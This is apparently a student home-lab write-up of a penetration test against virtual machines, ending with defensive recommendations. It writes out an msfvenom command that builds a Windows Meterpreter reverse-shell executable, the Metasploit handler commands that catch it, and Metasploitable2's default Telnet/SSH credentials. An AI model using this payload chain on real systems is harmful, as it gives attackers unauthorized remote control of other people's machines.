# System Security Testing Lab

> Part of a 6-project cybersecurity home lab series. See the related repos: `cybersecurity-home-lab-setup`, `network-recon-nmap-nessus`, `network-traffic-analysis-wireshark`, `dvwa-web-app-pentest-burpsuite`, `system-security-testing-lab`, `soc-incident-investigation-sim`.

**Project ID:** PTID-CHE-AUG-25-179
**Environment:** Windows 10 Pro, Windows 7 Pro, Metasploitable2
**Tools:** Metasploit Framework, msfvenom, Meterpreter, Nmap

## 1. Introduction
System hacking is a penetration testing methodology used to evaluate the
security resilience of computer systems by exploiting vulnerabilities,
injecting payloads, and leveraging open/misconfigured services. This
project simulates that process end-to-end: crafting a payload, deploying
it against Windows targets, and separately exploiting a vulnerable Linux
target — from both the attacker's and defender's point of view.

## 2. Problem Statement
- **System vulnerabilities** — flaws in OS/app configuration can be
  exploited for unauthorized access.
- **Limited visibility** — without hands-on testing, weaknesses go
  unnoticed until they're exploited for real.
- **Compliance** — frameworks like GDPR/HIPAA expect regular penetration
  testing as part of a security program.

## 3. Tools Used
| Tool | Purpose |
|---|---|
| Metasploit Framework | Core exploitation framework (payloads, exploits, post-exploitation) |
| msfvenom | Crafted the custom Windows reverse-TCP payload |
| Meterpreter | Post-exploitation interaction with the compromised Windows target |
| Nmap | Scanning/identifying open ports and services on Metasploitable2 |
| VirtualBox / VMware | Hosted Windows 10 Pro, Windows 7 Pro, and Metasploitable2 |

---

## Part A — Windows Payload Creation
**Attacker machine:** Kali Linux

```bash
apt install terminator -y
sudo su
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=5555 -f exe -o shellmeter.exe
```

| Step | Screenshot |
|---|---|
| Kali Linux opened | ![Kali opened](./screenshots/01-payload-creation/01-kali-linux-opened.png) |
| Terminator installed | ![Terminator installed](./screenshots/01-payload-creation/02-terminator-installed.png) |
| Root access via `sudo su` | ![Root access](./screenshots/01-payload-creation/03-root-access-sudo-su.png) |
| msfvenom command run | ![msfvenom command](./screenshots/01-payload-creation/04-msfvenom-command.png) |
| Payload `shellmeter.exe` created | ![Payload created](./screenshots/01-payload-creation/05-payload-created-shellmeter-exe.png) |
| Payload copied to working path | ![Payload path copy](./screenshots/01-payload-creation/06-payload-path-copy.png) |

**Result:** Windows payload created successfully.

---

## Part B — Windows 10 Pro Misconfiguration
Simulated a misconfigured endpoint by disabling Windows' built-in
protections — the kind of change a real attacker would look to trigger via
social engineering or a compromised admin session.

**Turning off Real-Time Protection:** Settings → Update & Security →
Windows Security → Virus & Threat Protection → Manage Settings → toggle off.

| Step | Screenshot |
|---|---|
| Windows 10 opened | ![Windows 10 opened](./screenshots/02-windows10-misconfiguration/01-windows10-opened.png) |
| Settings (Win+I) | ![Settings](./screenshots/02-windows10-misconfiguration/02-settings-winI.png) |
| Update & Security | ![Update and Security](./screenshots/02-windows10-misconfiguration/03-update-and-security.png) |
| Windows Security | ![Windows Security](./screenshots/02-windows10-misconfiguration/04-windows-security.png) |
| Virus & Threat Protection | ![Virus and Threat Protection](./screenshots/02-windows10-misconfiguration/05-virus-threat-protection.png) |
| Manage settings | ![Manage settings](./screenshots/02-windows10-misconfiguration/06-manage-settings.png) |
| Real-time protection toggle | ![RTP toggle](./screenshots/02-windows10-misconfiguration/07-real-time-protection-toggle.png) |
| Real-time protection off | ![RTP off](./screenshots/02-windows10-misconfiguration/08-real-time-protection-off.png) |
| Confirm prompt | ![Confirm](./screenshots/02-windows10-misconfiguration/09-confirm-prompt-yes.png) |
| Misconfiguration complete | ![Complete](./screenshots/02-windows10-misconfiguration/10-defender-misconfig-complete.png) |

**Turning off Windows Defender Firewall:** Run (`Win+R`) → `control` →
System & Security → Windows Defender Firewall → turn off for both Private
and Public networks.

| Step | Screenshot |
|---|---|
| Run → control | ![Run control](./screenshots/02-windows10-misconfiguration/11-run-control-panel.png) |
| System & Security | ![System and Security](./screenshots/02-windows10-misconfiguration/12-system-and-security.png) |
| Windows Defender Firewall | ![Defender Firewall](./screenshots/02-windows10-misconfiguration/13-windows-defender-firewall.png) |
| Turn firewall on/off | ![Turn firewall on off](./screenshots/02-windows10-misconfiguration/14-turn-firewall-on-off.png) |
| Both profiles disabled | ![Firewall disabled](./screenshots/02-windows10-misconfiguration/15-firewall-disabled-private-public.png) |
| Misconfiguration complete | ![Complete](./screenshots/02-windows10-misconfiguration/16-firewall-misconfig-complete.png) |

**Why this matters:** disabling real-time protection and the firewall is
exactly what allows an unsigned payload like `shellmeter.exe` to execute
and phone home without being blocked — this step demonstrates *why* those
controls exist, not just how to turn them off.

---

## Part C — Windows 7 Pro Exploitation
**Attacker machine:** Kali Linux · **Target:** Windows 7 Pro (payload copied over from Part A)

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.69
set LPORT 5555
run
```

| Step | Screenshot |
|---|---|
| Payload copied to target | ![Payload copied](./screenshots/03-windows7-exploit/01-payload-copied-to-target.png) |
| `use exploit/multi/handler` | ![Multi handler](./screenshots/03-windows7-exploit/02-msfconsole-multi-handler.png) |
| Set payload/LHOST/LPORT | ![Set options](./screenshots/03-windows7-exploit/03-set-payload-lhost-lport.png) |
| Handler running | ![Handler running](./screenshots/03-windows7-exploit/04-handler-running.png) |
| Target executes payload | ![Target executes](./screenshots/03-windows7-exploit/05-target-executes-payload.png) |
| Meterpreter session established | ![Session established](./screenshots/03-windows7-exploit/06-meterpreter-session-established.png) |

**Post-exploitation commands run:**

| Command | Purpose | Screenshot |
|---|---|---|
| `getuid` | Confirm compromised user context | ![getuid](./screenshots/03-windows7-exploit/07-getuid-command.png) |
| `pwd` | Confirm working directory | ![pwd](./screenshots/03-windows7-exploit/08-pwd-command.png) |
| `help` | List available Meterpreter commands | ![help](./screenshots/03-windows7-exploit/09-help-command.png) |
| — | Basic command execution | ![basic commands](./screenshots/03-windows7-exploit/10-basic-commands-execution.png) |
| `sysinfo` | Pull target system information | ![sysinfo](./screenshots/03-windows7-exploit/11-sysinfo-command.png) |
| `shell` | Drop into a native shell | ![shell](./screenshots/03-windows7-exploit/12-shell-command.png) |
| — | Execute applications on target | ![execute apps](./screenshots/03-windows7-exploit/13-executing-applications.png) |
| `ps` | List running processes | ![list processes](./screenshots/03-windows7-exploit/14-listing-processes.png) |
| `kill` | Terminate a process | ![terminate process](./screenshots/03-windows7-exploit/15-terminating-processes.png) |
| `shutdown` | Remotely shut down the target | ![remote shutdown](./screenshots/03-windows7-exploit/16-remote-shutdown.png) |

**Result:** Full remote access achieved via Meterpreter, simulating a
real-world system compromise from initial payload execution through
post-exploitation control.

---

## Part D — Metasploitable2 Exploitation
**Target:** Metasploitable2 (`192.168.1.44`)

**Recon** (full write-up in [`network-recon-nmap-nessus`](https://github.com/<your-username>/network-recon-nmap-nessus)):
confirmed the host was alive and ran a full port scan.

| Step | Screenshot |
|---|---|
| `ifconfig` on target | ![ifconfig](./screenshots/04-metasploitable2-exploit/01-ifconfig-target.png) |
| `ping` to confirm alive | ![ping alive](./screenshots/04-metasploitable2-exploit/02-ping-target-alive.png) |
| `nmap 192.168.1.44 -p-` | ![nmap command](./screenshots/04-metasploitable2-exploit/03-nmap-full-port-scan-command.png) |
| Scan results | ![nmap results](./screenshots/04-metasploitable2-exploit/04-nmap-scan-results.png) |

**Exploitation via Telnet (port 23):** identified as the easiest way in —
Metasploitable2 ships with well-documented default credentials.

```bash
telnet 192.168.1.44
# login: msfadmin / msfadmin
```

| Step | Screenshot |
|---|---|
| Telnet connection attempt | ![Telnet attempt](./screenshots/04-metasploitable2-exploit/05-telnet-connect-attempt.png) |
| Default credentials identified (`msfadmin:msfadmin`) | ![Default creds](./screenshots/04-metasploitable2-exploit/06-default-credentials-found.png) |
| Logged in via Telnet | ![Telnet login](./screenshots/04-metasploitable2-exploit/07-telnet-login.png) |
| Access gained | ![Access gained](./screenshots/04-metasploitable2-exploit/08-access-gained.png) |
| Verified connection via `ifconfig` | ![Verify connection](./screenshots/04-metasploitable2-exploit/09-ifconfig-verify-connection.png) |
| Basic commands cross-verified | ![Cross verify](./screenshots/04-metasploitable2-exploit/10-basic-commands-crossverify.png) |

**Repeated over SSH (port 22)** to confirm the same default credentials
were reused across services:

| Step | Screenshot |
|---|---|
| SSH connection attempt | ![SSH attempt](./screenshots/04-metasploitable2-exploit/11-ssh-port-connect.png) |
| Logged in with default credentials | ![SSH login](./screenshots/04-metasploitable2-exploit/12-ssh-default-creds-login.png) |
| Commands cross-checked | ![SSH cross-check](./screenshots/04-metasploitable2-exploit/13-ssh-commands-crosscheck.png) |

**Result:** Access gained via two separate services (Telnet and SSH) using
the same default credential pair — highlighting how credential reuse
across services multiplies the impact of a single weak password.

---

## 4. Key Findings Summary
| Target | Vector | Outcome |
|---|---|---|
| Windows 7 Pro | Reverse-TCP payload (msfvenom + Meterpreter) | Full remote shell access |
| Windows 10 Pro | Manual misconfiguration (Defender/Firewall off) | Demonstrated the control gap that enables payload execution |
| Metasploitable2 | Default credentials over Telnet & SSH | Shell access via two services |

## 5. Defensive Recommendations
1. **Patch management** — automate OS/software updates
2. **Continuous penetration testing** — regularly simulate attacks
3. **Zero Trust** — limit lateral movement inside the network
4. **Advanced monitoring** — SIEM/EDR to catch payload execution and unusual process activity
5. **Credential hygiene** — never reuse default credentials across services; disable them entirely where possible
6. **Endpoint hardening** — real-time protection and host firewalls should be enforced by policy, not left toggleable by a standard user

## 6. Conclusion
This project reinforces that a single weak control — a default credential,
a disabled firewall, an unsigned executable allowed to run — is often all
that separates a hardened system from a fully compromised one. The same
credential pair worked across two different services on Metasploitable2,
and disabling two Windows security features was enough to let a
custom payload execute freely. Small gaps compound quickly.

## Screenshots
Organized by sub-project under [`screenshots/`](./screenshots):
`01-payload-creation/`, `02-windows10-misconfiguration/`,
`03-windows7-exploit/`, `04-metasploitable2-exploit/`.
